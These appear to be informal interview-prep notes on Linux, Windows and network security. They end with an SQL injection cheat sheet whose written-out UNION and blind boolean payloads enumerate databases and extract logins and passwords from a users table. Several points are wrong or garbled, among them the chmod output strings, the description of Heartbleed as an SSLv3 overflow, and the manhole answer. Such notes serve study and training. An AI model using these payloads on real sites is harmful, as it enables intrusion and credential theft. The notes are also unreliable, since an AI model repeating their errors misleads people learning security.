	* If asked how to get info on a command, tool, etc, say you would use "man"
		* Know how to use man, etc

- Grep
	* know how to use it and what some of the flags are
	* What would you use it for
  * -e pass multiple paramaters,

Example:
grep -e fun -e fuck = must contain fun and fuck to list it

- netstat
	- netstat $1 | grep -ve 172.16.1.12 -ve fun.sh
	-ve shows lines that don't contain ___

- ngrep
	- can actually look at the payload in the packet

- curl
  * what is it and how can you use it
	*(used to make requests, can do all sorts of shit.)*

tool to transfer data from or to a server, using one of the supported protocols (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP).

The command is designed to work without user interaction.

-	wget
	- *what is it and how can you use it*
	-	download files on command lines

- Iptables

#### Q: what is it?

* Linux Kernel Firewall
* Chain of rules

* -A append | -D delete | -I insert | -R replace | -L list | -F flush | -N new chain | ...

* -s -> source
* -p -> protocol
* -d -> destination
* -j -> jump
* -g -> goto
* -i -> interface
* --dport -> destination port
* --sport -> source port

Examples

* Block conection from ip
	* iptables -A INPUT -s 10.10.10.10 -j DROP
* Block conection to port
	* iptables -A INPUT -p tcp --dport 21 -j DROP
* List all rules
	* iptables -L
* Delete all rules
	* iptables -F

#### drop vs reject

- drop - drops
-	reject - sends code back

---

#### ACLs (Access Control Lists)
Access Control List (ACL) provides an additional, more flexible permission mechanism for file systems. It is designed to assist with UNIX file permissions. ACL allows you to give permissions for any user or group to any disc resource.

-e pass multiple paramaters,

Examples:

grep -e fun -e fuck = must contain fun and fuck to list it

netstat $1 | grep -ve 172.16.1.12 -ve fun.sh
* -ve shows lines that don't contain ___

---

#### 	Linux File Security (drwxrwxrwx)

* Directory | Owner | Group | Other
	* Read | Write | Execute

Examples:

* > chmod g+r file.txt    >>>  ----r-----
* > chmod +744 file.txt   >>>  -1111--1--


* ANAME record
	* tells you the last time the file was accessed
	* > ls -lu
* CTIME record
	* the time when the content or attribute were changed
	* > ls -lc
* MTIME record
	* last time it was modified
	* > ls -l

---

#### Net Filter

* Linux distribution firewall
* Implementation can be "iptables"

#### Linux Security Features (Passwords, Groups, etc)

* Least privilege
- account per service service

---


## 8. Windows:

---

### Sysinternals Suite
Have several different tools (at least 5) that you like to use and can talk about

* AccessChk
	* Check which users have access to what
	* See who has access to use files
	* See is certain users have access to which files

* AdExplorer
	* Active Directory Explorer
	* Save snapshots of AD database
	* Modify object properties and attibutes
	* Edit permissions

* AutoLogon
	* Define default username and password to use at every log on
	* Hold on shift while auto logging to disable that time

* Autoruns
	* Disable|Enable executables to start at startup
	* Kills programs that are already running
	* Removes scheduled tasks

* DiskView
	* Shows a graphical map of your disk
	* cluster of files

* LogonSessions
	* Who else is logged in into the system
	* Which programs the other users are running

* MoveFile
	* Move a file at system start up
	* Delete file at startup
	* > moveFile test.exe ""

* Process Explorer
	* Like task manager
	* See all running processes
	* kill process or process tree

* PsExec
	* Telnet based application
	* lets run applications in other system

* PsKill
	* kill processes in local computer and remote computer

* PsLoggedOn
	* See who is using resources, who is logged in, in local and remote computer

* PsPasswd
	* Change pwd of users in local and remote computers

* PsShutdown
	* Shutdown|reboot a local or remote computer at a certain time

* WhoIs
	* Gives registered domain information such as owner information, name servers, expiration dates

---

## Questions
	5 (at a min) Windows Security Features
		Passwords
		Permissions

1. Windows Defender ATP
2. Local Firewall
3. User Account Control
4. BitDefender

###	Windows Event View Logs

* Look in windows event logs for a list of types (Security, etc)
* Know what each would contain (just be able to talk about them)
	* access logs, etc

#### Windows Logs
Look at all the different catagories in windows event viewer

* Application Log
	* Events logged by programs
	* Determined by software developers

* Security Log
			* Invalid and valid logon attempts
			* Creating/opening/deleting files

* System Log
	* System related events
	* Failed to mount a drive. etc.

* Database Log

* Device Log

* Audit Log

* Event Types

* Information
	* Event describing a sucessful operation.

* Warning
	* Not necessary an issue, but may cause problems later.

* Error
	* Significant problem, may involve data/functionality loss

* Success Audit
	* Describes the success of an audited security event. ie. user log in

* Failure Audit
	* Describes a security event that not completed successfully. Failed to authenticate


#### *ADDS (Active Directory Domain Services)*
Microsoft's directory access control

* Know what it is and be able to talk about it

---
---

## 9. Scripting:

---

### Bash

given csv - how would you process?
		cat file
		cut -d , -f
			separate rows and columns
		grep

---

Python

---
---


## 10. Random / Trick Questions:

---

### Q: How does traceroute work and what is it?
A: TTL

- decremented by 1 at each hop
- 255 - 255 devices before it gets to
- 0 returns error
- starts at 1, increments each time

---

###	Q: How does NMAP work?
A: sends TCP and UDP packets to the target machine and then it examines the response by comparing the result with the database.

---

### Q: How to use telnet or netcat to make a http GET request
A: telnet <hostip> GET / HTTP/1.0

-	1.0 vs 1.1
-	1.1 requires you to have the host header

---

###	IPV4 vs IPv6
A: hardware/ bandwidth constraints

---

###	Q: What is the last tentative book you have read?
A: Network security bible v2 by Eric Cole

---

### Q: Why is FTP insecure?
A: Sends file and data in plain text

- Not encrypted
- Vulnerable to MITMA

---

### Q: What and how should you use to transfer files securely
A:	Using SFTP

* Secure File Transfer Protocol
* Encrypted communications

A:	Using VPN

A:	Using SCP
* Secure CoPy
* Based on SSH protocol
* transfer file from local host to remote host

Examples:



* Copy file to host
	* > scp SourceFile user@host:directory/TargetFile

* Copy file from host
	* > scp user@host:directory/SourceFile TargetFile
	* > scp -r user@host:directory/SourceFolder TargetFolder

---

###	Q: How would you escalate privileges?
A: Once I had a shell I'd use the enable command with the admin pwd

---

###	Q: Where do you hear about/keep up with exploits?
- twitter
- linkedin
-	exploit db
-	nist
- USCERT
-	security focus

### Q:	What are some recent exploits you have heard about?
A:

- Apache struts
- joomla rce
-	juniper firewall
-	heartbleed
-	shellshock

---

### Q: What protocol would you use if you have lots of devices but few Public ips?
A: NAT (Network Address Translation)

### Q: What can you use to finger print an operating system
A: TTL -RTFM

- Not nmap, but information that can be gleened from a network packet
- Google will help you find the answer(s)

## Q: 	Trick Questions:

### Q:  What is the evil bit?
A: April fools joke RFC,
if traffic is malicious, tcp headers evil bit must be checked.

---

### Q:  how can you enumerate all adresses ipv6?
A: cant enumerate 2^64 1 billion addresses / person scanning it is impossible

---

### Q: Why are manholes round?
A: It's the only shape that cannot be rotated so that it cannot fall down the hole.

---


---
---
## 11. Web Attacks
---
###	Named Attacks:

* Shellshock -> bash

	Heartbleed:
		- sslv3
		- buffer overflow

### Cross Site Scripting

* Usually a Web vulnerability
* Caused because inputs are not sanitized.

* Reflected (non persistent)
	* Attacker injects scripts, usually in HTML forms. Then processed server side.
	* May cause change of HTML markup. Markup Injection
	* Reflected attack usually delivered via email, sending url that points to a site with XSS vector

#### Example
In a form, insert a js alert function.

Persistent

* Provided when data of user is saved in server.
* In a form field a js script is inserted that imports other files.
* Can be used to steal cookies, import own scripts.

* Protect from XSS infected site
	* Disable Scripts

* Protect from XSS
	* Sanitize inputs

---

### Cross Site Request Forgery

* Exploits the trust the site has with the browser
* Makes the browser send HTTP request to target sites that requires auth
* If site uses cookies and have not expired, then the auth will be valid

* Ways to prevent it
	* Place a random generated token in each request.
	* Using CAPTCHA

---

### SQL injection
#### SQL Injection Cheat Sheet:

+------------------+
| Conversion Chart |
+------------------+
  %27   -->   '
  %3B   -->   ;
  %28   -->   (
  %29   -->   )
  %5C   -->   \
  %2F   -->   /
  %3F   -->   ?
  %21   -->   !
  %26   -->   &
  %5E   -->   ^
  %25   -->   %
  %24   -->   $
  %23   -->   #
  %40   -->   @
  %22   -->   "
  %3A   -->   :
  %3E   -->   >
  %3C	-->   <
	---


---
#### *SQL Injection GET/Search*
---

+--------------+
| Table Return |
+--------------+
1) See if input is exploitable
'
we should get an error returned...

2) Get number of columns
' ORDER BY 7 -- -
' ORDER BY 7#

keep incrementing until error, it
is the number before error...

3) Get the database name
' UNION ALL SELECT 1,database(),3,4,5,6,7 -- -

4) Get the tables in the database
' UNION ALL SELECT 1,table_name,2,4,5,6,7 FROM information_schema.tables

this will get all tables for every database...

' UNION ALL SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

this will only list tables in the current database...

5) Get the columns names for the tables
' UNION ALL SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users' and table_schema=database() -- -

6) Get data from columns
' UNION ALL SELECT 1,login,password,email,secret,6,7 FROM users -- -
---

---
#### *Blind SQL Injection*
---



+----------------+
| Boolean Return |
+----------------+
1) Find something that returns true
Iron Man

2) See if the input is exploitable
Iron Man' AND 1=1 -- -
Iron Man' AND 1=1#

then...

Iron Man' AND 1=2 -- -
Iron Man' AND 1=2#

the above should return false...

3) Get SQL Version
Iron Man' AND substring (version(),1,1)=4 -- -

keep increment until TRUE is returned...

4) Get length of database name
Iron Man' AND length(database())=4 -- -

keep incrementing until TRUE is returned...

5) Brute force database name
Iron Man' AND substring(database(),1,1)='a' -- -
Iron Man' AND substring(database(),1,1)='b' -- -
...
Iron Man' AND substring(database(),1,1)='Z' -- -

Iron Man' AND substring(database(),2,1)='a' -- -
Iron Man' AND substring(database(),2,1)='b' -- -
...
Iron Man' AND substring(database(),3,1)='Z' -- -

keep incrementing till the database name has been
brute forced, remember we got the length of the
name above...
---
---
